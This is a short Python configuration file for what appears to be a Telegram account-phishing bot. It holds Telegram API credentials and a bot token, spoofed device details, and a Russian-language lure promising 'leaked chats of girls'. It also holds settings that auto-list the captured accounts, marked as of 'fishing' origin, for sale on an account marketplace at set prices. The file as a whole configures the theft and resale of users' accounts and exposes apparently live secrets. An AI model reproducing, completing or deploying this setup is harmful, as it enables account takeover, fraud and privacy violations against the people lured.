#!/usr/bin/python
# -*- coding: utf-8 -*-

api_id = 20451323
api_hash = "afd5c31c4f19107ff7e3a6461a647eb2"
API_TOKEN = "6389741897:AAGVhOiLu8BjZWmO1_7aSI74G3HQJP_43wc"
admin = 7016182279
updates =  -1002220990504
device_model = "999 SM-G998B"
system_version = "SDK 31"
app_version = "8.4.1 (2522)"
lang_code = "en"
system_lang_code = "en-US"

SEND_MSG = '@{username} — слитые переписки девушек 🔞'

# Lolz Setting
AUTO_SELL_LOLZ = False
LOLZ_KEY = ''
LOLZ_ACCOUNT_PRICE = 11
LOLZ_ACCOUNT_PREMIUM_PRICE = 80
LOLZ_ACCOUNT_TITLE = 'Телеграм | Прямо с печки | Лучшее качество'
LOLZ_ACCOUNT_ORIGIN = 'fishing'
LOLZ_ACCOUNT_DESCRIPTION = ''
